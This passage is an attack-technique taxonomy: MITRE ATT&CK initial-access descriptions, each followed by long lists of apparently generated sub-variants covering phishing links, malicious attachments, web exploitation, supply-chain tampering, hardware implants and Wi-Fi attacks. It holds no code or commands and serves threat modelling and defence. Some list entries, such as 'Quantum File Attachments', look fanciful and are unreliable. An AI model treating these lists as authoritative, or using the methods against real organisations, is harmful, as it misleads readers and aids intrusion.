      Spearphishing Link: Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)
        ~Credential Harvesting Sites: Links direct to fake login pages mimicking legitimate services to steal credentials
        ~Drive-by Download Links: Links to compromised or malicious websites that automatically download malware without user interaction
        ~URL Shortener Obfuscation: Use of URL shortening services to mask malicious links and bypass security filters
        ~Dynamic DNS Redirectors: Links using dynamic DNS services to redirect victims through multiple hop points
        ~QR Code Links: Embedding QR codes in emails that resolve to malicious URLs
        ~One-Time Use Links: Links that only work once or for a limited time to evade detection
        ~Cloud Service Links: Malicious links hosted on legitimate cloud services to appear trustworthy
        ~Mobile-Specific Links: Links specifically crafted to target mobile email clients and browsers
        ~Multi-Stage Redirect Links: Links that chain multiple redirects through legitimate services
        ~API Authentication Links: Links that attempt to trick users into authorizing malicious apps via OAuth or similar protocols
        ~HTML Smuggling Links: Links to HTML files that use JavaScript blobs to bypass network security controls
        ~Calendar Invitation Links: Malicious links embedded in calendar meeting requests
        ~Collaborative Platform Links: Links exploiting collaboration platforms (Slack, Teams) integration with email
        ~Weaponized Link Previews: Links crafted to exploit link preview generators in email clients
        ~Delayed Payload Links: Links to content that only becomes malicious after initial security scans
        ~Browser Extension Links: Links designed to trick users into installing malicious browser extensions
        ~Progressive Web App Links: Links prompting installation of malicious progressive web apps
        ~SMS Redirect Links: Links that trigger SMS or messaging app deep links for hybrid attacks
        ~Document Share Request Links: Links masquerading as requests to collaborate on cloud documents
        ~Certificate Error Bypass Links: Links exploiting users' tendency to bypass certificate warnings
        ~Virtual Meeting Links: Malicious links disguised as video conference joining URLs
        ~Support Ticket Links: Links masquerading as IT support or customer service ticket responses
        ~Software Update Links: Links posing as legitimate software update notifications
        ~Payment Processing Links: Links impersonating financial transaction confirmations
        ~Automated Workflow Links: Links exploiting automated business process notifications
        ~Code Repository Links: Links targeting developers through fake code collaboration requests
        ~Digital Signature Links: Links masquerading as electronic document signing requests
        ~Training Platform Links: Links disguised as mandatory corporate training materials
        ~Survey/Feedback Links: Links presented as corporate or customer surveys
        ~Job Application Links: Links exploiting job application processes and career portals
        ~Social Media Integration Links: Links exploiting email-to-social-media sharing features
        ~Vendor Portal Links: Links masquerading as supplier/vendor management system notifications
        ~Compliance Notification Links: Links appearing as regulatory or compliance-related updates
        ~Emergency Alert Links: Links exploiting emergency notification systems or crisis communications
        ~AI-Generated Personalized Links: Links using AI-gathered information for highly targeted content
        ~Audit Request Links: Links posing as internal or external audit documentation requests
        ~Benefits Enrollment Links: Links exploiting employee benefits and healthcare enrollment processes
        ~Travel Booking Links: Links masquerading as corporate travel booking confirmations
        ~Asset Management Links: Links appearing as IT asset management or inventory requests
        ~License Management Links: Links impersonating software license management notifications
      Spearphishing Attachment: Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.  There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
        ~Malicious Office Documents: Uses weaponized Microsoft Office documents containing macros, DDE, or other malicious content
        ~PDF Attachments: Leverages malicious PDF files that contain JavaScript, exploit vulnerabilities, or trigger external connections
        ~Archive Files: Uses compressed files (ZIP, RAR, etc.) to hide malicious content or bypass email filters
        ~Double Extension Files: Manipulates file extensions to make executables appear as benign documents
        ~Password Protected Archives: Sends password-protected archives with credentials in email body to bypass scanning
        ~Executable Masquerading: Disguises executable files as legitimate document types through icon/extension manipulation
        ~Multi-Stage Attachments: Uses seemingly benign files that download additional malicious content upon opening
        ~Template Injection: Leverages malicious document templates to execute code when files are opened
        ~Embedded Objects: Includes malicious objects within legitimate-looking documents
        ~File-less Attachments: Uses specially crafted documents that exploit vulnerabilities without dropping files
        ~HTML Attachments: Uses HTML files that contain malicious scripts or redirect to phishing pages
        ~Container Files: Leverages container formats like ISO, IMG, or VHD to bypass mark-of-the-web protections
        ~Polyglot Files: Creates files that are valid as multiple formats simultaneously to bypass filters
        ~Digitally Signed Malware: Uses stolen or fraudulent certificates to sign malicious attachments
        ~Dynamic Loading Attachments: Employs documents that load malicious content from remote templates or locations
        ~Steganography-based Attachments: Hides malicious code within seemingly benign images or documents
        ~Language-Specific Targeting: Crafts attachments in specific languages or regional formats to target specific organizations
        ~Time-Bombed Attachments: Uses files that only activate malicious behavior after a specific date/time
        ~Memory-Only Attachments: Documents that execute malicious code entirely in memory without disk writes
        ~Right-to-Left Override Attachments: Uses RTLO character manipulation to disguise file extensions
        ~OLE Package Objects: Embeds malicious files within OLE objects to bypass detection
        ~Cloud Storage Links: Attachments that reference malicious content stored in legitimate cloud services
        ~Quantum File Attachments: Files that appear different when intercepted vs. when delivered
        ~Living-off-the-Land Attachments: Documents that only use legitimate system tools for malicious purposes
      Exploit Public-Facing Application: Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.  Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).  If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.  Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)  For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)
        ~SQL Injection: Exploiting web applications by injecting malicious SQL queries to manipulate backend databases
        ~Cross-Site Scripting: Exploiting web applications by injecting malicious client-side scripts
        ~Remote Code Execution via Web Shell: Exploiting vulnerabilities to upload and execute malicious web shells
        ~Authentication Bypass: Exploiting flaws in authentication mechanisms to gain unauthorized access
        ~Network Service Buffer Overflow: Exploiting buffer overflow vulnerabilities in network services like SMB or SSH
        ~Container Escape Exploitation: Exploiting containerized applications to break out of container isolation
        ~Cloud Instance Metadata Exploitation: Exploiting cloud instance metadata services to gain unauthorized access
        ~IoT/Edge Device Exploitation: Exploiting vulnerabilities in edge devices and network appliances
        ~Virtualization Platform Exploitation: Exploiting vulnerabilities in virtualization platforms like ESXi
        ~API Gateway Exploitation: Exploiting vulnerabilities in API gateways and management interfaces
        ~Directory Traversal: Exploiting file path handling to access unauthorized files outside web root
        ~Deserialization Vulnerabilities: Exploiting unsafe deserialization in applications to execute arbitrary code
        ~SSRF (Server-Side Request Forgery): Exploiting server-side URL handlers to access internal resources
        ~XML External Entity (XXE): Exploiting XML processors to access unauthorized files or execute code
        ~Default Configuration Exploitation: Exploiting default or misconfigured application settings
        ~Framework-Specific CVE Exploitation: Exploiting known vulnerabilities in common web frameworks
        ~Protocol Implementation Flaws: Exploiting weaknesses in protocol implementations like HTTP/2
        ~Remote Procedure Call Exploitation: Exploiting vulnerabilities in RPC interfaces
        ~Memory Corruption in Network Services: Exploiting memory safety issues in network-facing services
        ~Service-Specific Authentication Bypass: Exploiting authentication weaknesses in specific services
        ~Business Logic Exploitation: Exploiting flaws in application logic and workflow validation
        ~Race Condition Exploitation: Exploiting timing vulnerabilities in concurrent operations
        ~Session Fixation: Exploiting weaknesses in session management mechanisms
        ~CORS Misconfiguration Exploitation: Exploiting misconfigured cross-origin resource sharing
        ~Template Injection: Exploiting server-side template engines to execute arbitrary code
        ~Command Injection: Exploiting insufficient input sanitization to execute system commands
        ~LDAP Injection: Exploiting LDAP query processing for unauthorized access
        ~Parameter Tampering: Exploiting insufficient parameter validation and processing
        ~Insecure Direct Object Reference: Exploiting weak access controls on resources
        ~WebSocket Vulnerability Exploitation: Exploiting vulnerabilities in WebSocket implementations
        ~Cache Poisoning: Exploiting web cache vulnerabilities to serve malicious content
        ~Proxy Server Exploitation: Exploiting vulnerabilities in reverse proxies and load balancers
        ~Service Worker Hijacking: Exploiting vulnerabilities in Progressive Web App service workers
        ~Microservice Communication Exploitation: Exploiting inter-service communication vulnerabilities
        ~Legacy Protocol Abuse: Exploiting outdated protocols still enabled on public-facing services
        ~GraphQL Endpoint Exploitation: Exploiting vulnerabilities in GraphQL implementations
        ~DNS Rebinding: Exploiting DNS handling to bypass same-origin policy
        ~Web Application Firewall Bypass: Exploiting WAF configuration weaknesses
        ~API Version Confusion: Exploiting inconsistencies between API versions
        ~Certificate Validation Bypass: Exploiting SSL/TLS certificate validation weaknesses
      Supply Chain Compromise: Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.  Supply chain compromise can take place at any stage of the supply chain including:  * Manipulation of development tools * Manipulation of a development environment * Manipulation of source code repositories (public or private) * Manipulation of source code in open-source dependencies * Manipulation of software update/distribution mechanisms * Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware)  * Replacement of legitimate software with modified versions * Sales of modified/counterfeit products to legitimate distributors * Shipment interdiction  While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)
        Compromise Hardware Supply Chain: Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.
          Insert malicious chips or components into server motherboards during manufacturing
          Modify network card firmware to include backdoor capabilities during production
          Replace legitimate microcontrollers with compromised versions in peripheral devices
          Intercept and tamper with hardware shipments at distribution centers
          Modify storage device firmware to include covert data exfiltration capabilities
          Install hardware keyloggers during assembly of keyboards or input devices
          Replace secure boot ROMs with modified versions containing malicious code
          Compromise testing equipment used in hardware quality control processes
          Modify hardware debugging interfaces to enable unauthorized access
          Insert malicious components into power supply units for persistence
          Replace cryptographic hardware security modules with compromised versions
          Modify BIOS/UEFI firmware during system assembly
          Tamper with hardware random number generators in security devices
          Insert malicious components into network routing equipment during production
          Modify industrial control system components before installation
          Compromise hardware-based authentication tokens during manufacturing
          Insert backdoors in hardware encryption modules
          Modify temperature sensors to enable thermal-based attacks
          Compromise hardware memory protection mechanisms
          Insert malicious components into backup power systems
          Modify hardware-based trusted platform modules (TPM) during manufacturing
          Insert malicious components into hardware security appliances
          Compromise hardware diagnostic ports during assembly
          Modify wireless communication modules in IoT devices
          Tamper with hardware memory controllers during production
          Insert backdoors in FPGA bitstream configurations
          Modify hardware-based DRM modules
          Compromise hardware virtualization components
          Insert malicious elements into hardware acceleration units
          Modify hardware-based secure enclaves
          Compromise hardware certification testing equipment
          Modify hardware signal integrity testing systems
          Insert backdoors during hardware prototype development
          Tamper with hardware electromagnetic shielding during production
          Modify hardware power management controllers
          Compromise hardware-based system management controllers
          Insert malicious components into hardware debug chains
          Modify hardware performance monitoring units
          Tamper with hardware thermal management systems
          Compromise hardware clock generation modules
          Compromise hardware serial interface controllers
          Modify hardware-based access control systems
          Insert backdoors in hardware interrupt controllers
          Tamper with hardware-based secure boot chains
          Modify hardware watchdog timers
          Compromise hardware-based intrusion detection systems
          Insert malicious components into hardware authentication modules
          Modify hardware-based encryption accelerators
          Tamper with hardware error detection circuits
          Compromise hardware isolation boundaries
        Compromise Software Dependencies and Development Tools: Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)    Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.
          Inject malicious code into popular NPM packages by compromising maintainer accounts
          Create typosquatting packages with names similar to popular dependencies
          Compromise build servers to inject malicious code during compilation
          Modify source code in Git repositories by exploiting CI/CD pipeline vulnerabilities
          Insert backdoors into development tools like compilers or IDEs
          Publish malicious versions of existing packages with higher version numbers
          Compromise package signing keys to distribute unauthorized updates
          Modify Maven Central repository artifacts through repository compromise
          Insert malicious code into Docker base images used in development
          Compromise local development environments through poisoned dependencies
          Compromise PyPI packages through account takeover or name squatting
          Insert malicious code into Visual Studio Code extensions
          Manipulate Gradle build scripts to include compromised dependencies
          Compromise Jenkins plugins used in build pipelines
          Insert malicious packages into Ruby Gems repository
          Modify Webpack loaders to inject malicious code during bundling
          Compromise Terraform modules in public registries
          Insert backdoors into Anaconda Python distributions
          Modify NuGet packages used in .NET development
          Compromise browser developer tools and extensions used by developers
          Compromise Android SDK components and development tools
          Insert malicious code into Xcode third-party frameworks
          Modify Unity Asset Store packages used in game development
          Compromise embedded systems cross-compilation toolchains
          Insert backdoors into automated testing frameworks like Jest or Selenium
          Modify static code analysis tools to ignore malicious patterns
          Compromise package managers for embedded systems (PlatformIO)
          Insert malicious code into code generation tools and templates
          Modify Kubernetes Helm charts used in development environments
          Compromise IDE debugging extensions and tools
        Compromise Software Supply Chain: Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.  Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)
          Inject malicious code into open-source package repositories like npm, PyPI, or RubyGems by compromising maintainer credentials
          Modify build scripts or CI/CD pipelines to include malicious components during compilation
          Replace legitimate software installers on download servers with trojanized versions
          Compromise code signing certificates to sign malicious updates as legitimate
          Insert backdoors into development tools like compilers or IDEs
          Manipulate source code repositories through compromised developer credentials
          Modify software update mechanisms to distribute malicious payloads
          Compromise build server infrastructure to inject malicious artifacts
          Insert malicious code into third-party libraries or dependencies
          Tamper with package manifest files to redirect dependencies to malicious sources
          Compromise software testing environments to inject malware during QA processes
          Manipulate software integrity verification mechanisms (checksums, hashes)
          Intercept and modify software packages during network distribution
          Compromise cloud-based build environments (GitHub Actions, AWS CodeBuild)
          Manipulate artifact repositories (like JFrog Artifactory or Nexus)
          Insert malicious code during automated code review processes
          Compromise software signing infrastructure in continuous deployment systems
          Modify container base images in registry services
          Manipulate dependency lock files (package-lock.json, Pipfile.lock)
          Compromise version control system hooks (git hooks, SVN hooks)
          Compromise release approval workflows to bypass security checks
          Manipulate software staging environments before production deployment
          Insert malicious code during software localization/translation processes
          Modify software specification documents to introduce subtle vulnerabilities
          Compromise automated dependency update systems (like Dependabot)
          Manipulate software release notes to hide malicious changes
          Inject malware during software packaging/bundling processes
          Compromise software mirror sites used for distribution
          Manipulate software bill of materials (SBOM) generation
          Compromise automated vulnerability scanning tools in the deployment pipeline
          Compromise software compliance certification processes to bypass security requirements
          Manipulate plugin/extension marketplaces for software platforms
          Insert malicious code through compromised software backup systems
          Exploit third-party API integration points during software assembly
          Compromise developer collaboration platforms (Slack, Teams) to inject malicious artifacts
          Manipulate software license verification systems
          Compromise software virtualization/containerization build processes
          Insert malware through compromised automated testing frameworks
          Manipulate software performance monitoring/telemetry systems
          Compromise configuration management databases used in builds
      Trusted Relationship: Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.  Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)  In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)
        ~Cloud Service Provider Compromise: Adversaries compromise cloud service providers or managed service providers to gain access to their customers' environments
        ~IT Service Provider Compromise: Adversaries target IT service contractors who have privileged access to customer networks
        ~Security Vendor Compromise: Adversaries compromise managed security service providers to access their clients' networks
        ~Infrastructure Contractor Abuse: Adversaries exploit physical infrastructure contractors' access (HVAC, security systems, etc.)
        ~Software Supply Chain Compromise: Adversaries compromise software vendors to distribute malicious updates to their customers
        ~Partner Account Delegation: Adversaries abuse delegated administrator permissions in cloud environments through compromised partner accounts
        ~Vendor Remote Access: Adversaries exploit remote access mechanisms provided to vendors for system maintenance
        ~Third-Party Integration Abuse: Adversaries compromise third-party applications or services integrated with target systems
      Drive-by Compromise: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:  * A legitimate website is compromised, allowing adversaries to inject malicious code * Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary * Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008)) * Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)  Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking "allow" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)  Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)  Typical drive-by compromise process:  1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes. 3. Upon finding a vulnerable version, exploit code is delivered to the browser. 4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.  Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.
        ~Watering Hole Attack: Targeting specific communities through compromised legitimate websites frequently visited by the target audience
        ~Malicious Browser Extensions: Exploiting browser extension vulnerabilities or distributing malicious extensions
        ~JavaScript Exploitation: Using malicious JavaScript code to exploit browser vulnerabilities
        ~Browser Push Notification Abuse: Leveraging browser notification permissions to execute malicious code
        ~Plugin Exploitation: Targeting vulnerable browser plugins and add-ons
        ~Cross-Site Scripting Injection: Exploiting XSS vulnerabilities to inject malicious code
        ~Malvertising Campaign: Delivering malicious code through compromised advertising networks
        ~Dynamic Content Injection: Modifying legitimate website content through compromised CDNs or third-party resources
        ~Browser Protocol Exploitation: Abusing custom protocol handlers and URL schemes
        ~iframe Injection: Using hidden or invisible iframes to load malicious content
        ~Browser Rendering Engine Exploitation: Targeting vulnerabilities in browser rendering engines (like Blink, Gecko, WebKit)
        ~Service Worker Hijacking: Exploiting service workers to maintain persistence and intercept network requests
        ~Web Assembly Exploitation: Leveraging WebAssembly to execute malicious code with near-native performance
        ~Local Storage Manipulation: Abusing browser's local storage mechanisms to maintain persistence
        ~HTML5 API Abuse: Exploiting HTML5 features and APIs for malicious purposes
        ~Web Worker Exploitation: Abusing web workers to perform malicious background processing
        ~Content Security Policy Bypass: Techniques to circumvent CSP protections
        ~Browser Fingerprinting: Advanced tracking and targeting based on browser characteristics
        ~Third-Party Script Supply Chain: Compromising third-party JavaScript libraries and CDN resources
        ~WebRTC Exploitation: Abusing WebRTC features for exploitation and data exposure
      Replication Through Removable Media: Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.  Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).
        ~USB Drive Autorun Exploitation: Adversaries leverage Windows Autorun/Autoplay features to automatically execute malware when USB drives are connected
        ~Mobile Device as Malicious Drive: Using smartphones or tablets as USB storage devices to deliver malware when connected to target systems
        ~Firmware Modification: Modifying the firmware of removable media devices to persist malware or exploit USB protocol vulnerabilities
        ~Supply Chain Compromise of Media: Intercepting and modifying removable media during manufacturing or distribution
        ~Custom USB Device Spoofing: Creating or modifying USB devices to appear as legitimate peripherals while containing malicious code
        ~Air-Gap Bypass via Physical Media: Specifically crafted techniques to transfer malware across air-gapped systems using removable media
        ~Charging Cable Attack: Using modified USB charging cables that contain malicious components for code execution
        ~Malicious Media File Masquerading: Disguising malware as legitimate media files on removable drives to trick users into execution
      Hardware Additions: Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.  While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)
        ~Network Tap Devices: Introduction of hardware devices that can passively monitor and intercept network traffic by connecting to network cables or ports
        ~Keystroke Injection Devices: Hardware devices disguised as legitimate peripherals that can programmatically inject keystrokes to execute commands
        ~DMA Attack Devices: Hardware tools that exploit Direct Memory Access to read or write system memory directly, bypassing OS-level protections
        ~Rogue Access Points: Physical deployment of unauthorized wireless access points to extend network access or create man-in-the-middle opportunities
        ~USB Hardware Implants: Modified USB devices containing additional malicious functionality beyond their apparent legitimate purpose
        ~Physical Bus Interceptors: Hardware devices that attach to system buses (PCIe, SATA, etc.) to intercept or modify data transmission
        ~Hardware Keyloggers: Physical devices installed between keyboards and computers to capture keystrokes
        ~Malicious Peripheral Devices: Modified legitimate peripherals (mice, keyboards, printers) with added malicious capabilities
        ~Network Protocol Analyzers: Specialized hardware designed to capture and analyze network traffic at the physical layer
        ~System Bus Analyzers: Hardware tools that can monitor and interact with system bus communications
        ~Hardware Debugging Ports: Physical devices that connect to debugging interfaces (JTAG, SWD) to gain low-level system access
        ~BIOS/UEFI Programmers: External hardware devices used to modify or replace system firmware
        ~Display Injection Devices: Hardware that intercepts and modifies video signals between computers and monitors
        ~Power Analysis Tools: Hardware devices that perform side-channel attacks through power consumption monitoring
        ~Modified Network Cards: Network interface cards with modified firmware or additional capabilities
        ~Cold Boot Attack Tools: Hardware devices designed to exploit system memory after power loss
        ~Hardware Supply Chain Implants: Malicious modifications made during manufacturing or distribution
      Wi-Fi Networks: Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks — requiring [Valid Accounts](https://attack.mitre.org/techniques/T1078) — belonging to a target organization.(Citation: DOJ GRU Charges 2018)(Citation: Nearest Neighbor Volexity) Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection.   Adversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target’s Wi-Fi network.(Citation: Nearest Neighbor Volexity)  Once an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) activities for [Credential Access](https://attack.mitre.org/tactics/TA0006) or [Discovery](https://attack.mitre.org/tactics/TA0007).
        ~Open Network Access: Adversaries exploit unsecured/open Wi-Fi networks to gain initial network access without requiring authentication
        ~WEP/WPA Cracking: Adversaries exploit weak encryption protocols to gain unauthorized access to secured wireless networks
        ~Evil Twin Attack: Adversaries set up rogue access points that mimic legitimate networks to intercept connections
        ~Remote Bridge Compromise: Adversaries compromise dual-homed systems to bridge connections to target wireless networks
        ~Wi-Fi Protected Setup (WPS) Exploitation: Adversaries exploit vulnerabilities in WPS to gain unauthorized network access
        ~Wireless Protocol Vulnerabilities: Adversaries exploit weaknesses in wireless protocols (like KRACK attack against WPA2)
        ~Signal Boosting: Adversaries use specialized equipment to connect to wireless networks from extended distances
        ~Guest Network Access: Adversaries exploit less-secured guest wireless networks to gain initial access
        ~Wireless Packet Injection: Adversaries inject malicious packets into wireless networks to exploit vulnerabilities
        ~MAC Spoofing: Adversaries bypass MAC address filtering by impersonating authorized devices
        ~Captive Portal Exploitation: Adversaries exploit vulnerabilities in wireless network login pages or authentication portals
        ~Rogue Access Point Placement: Adversaries physically plant malicious wireless access points within organization premises
        ~Wi-Fi Pineapple Attacks: Adversaries use specialized hardware devices to perform automated wireless network attacks
        ~Client Configuration Exploitation: Adversaries exploit automatic wireless network connection features on client devices
        ~Band Switching Attacks: Adversaries force clients to switch between different wireless bands (2.4GHz/5GHz) to intercept traffic
      External Remote Services: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)  Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.  Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)
        ~VPN Service Exploitation: Adversaries may exploit vulnerabilities in VPN services or their authentication mechanisms to gain unauthorized access to internal networks
        ~Remote Desktop Protocol Abuse: Adversaries may target RDP services exposed to the internet, attempting to brute force credentials or exploit vulnerabilities
        ~Cloud Service Console Access: Adversaries may target exposed cloud service management interfaces like AWS Console or Azure Portal
        ~Container API Exploitation: Adversaries may target exposed container management APIs like Docker API or Kubernetes dashboard
